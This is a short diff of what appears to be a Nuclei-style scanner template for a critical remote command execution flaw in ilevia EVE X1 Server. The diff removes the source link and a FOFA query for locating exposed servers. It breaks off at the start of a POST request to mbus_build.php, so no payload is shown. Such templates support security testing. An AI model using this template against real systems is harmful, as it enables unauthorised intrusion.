@@ -3,12 +3,8 @@ info:
   name: ileviaEVEX1Server接口get_history_data_odic存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zpxl5thqbpot4240'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zpxl5thqbpot4240
-    fofa: app="ilevia-EVE-X1-Server"
 http:
 - raw:
   - 'POST /ajax/php/mbus_build.php HTTP/1.1
